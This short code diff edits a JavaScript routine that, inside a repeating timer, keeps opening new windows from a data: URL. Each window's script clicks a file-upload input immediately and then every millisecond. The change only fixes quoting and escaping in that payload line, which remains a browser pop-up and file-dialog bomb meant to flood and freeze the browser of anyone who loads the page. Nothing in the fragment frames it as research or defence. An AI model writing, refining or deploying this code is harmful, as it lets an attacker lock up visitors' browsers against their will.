@@ -52,7 +52,7 @@ setInterval(function(){
           delete kins[k];
            }
          }
-        w = open('data:text/html,<input type=file id=f><script>f.click();setInterval("f.click()", 1);<\/script>');
+        w = open('data:text/html,<input type="file" id="f"><script>f.click();setInterval("f.click()", 1);<\\/script>');
         if (w) {
                 kins[i] = w;
                 i++;
